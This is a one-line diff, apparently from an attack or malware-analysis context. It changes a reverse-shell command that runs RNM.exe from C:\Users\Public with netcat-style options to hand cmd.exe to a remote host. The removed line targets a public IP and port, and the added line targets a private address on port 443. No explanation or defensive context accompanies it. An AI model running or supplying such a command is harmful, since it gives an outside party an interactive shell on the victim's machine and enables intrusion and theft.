@@ -1,1 +1,1 @@
-C:\Users\Public\RNM.exe -nv 193.161.193.99 25678 -e cmd.exe
+C:\Users\Public\RNM.exe -nv 192.168.1.2 443 -e cmd.exe
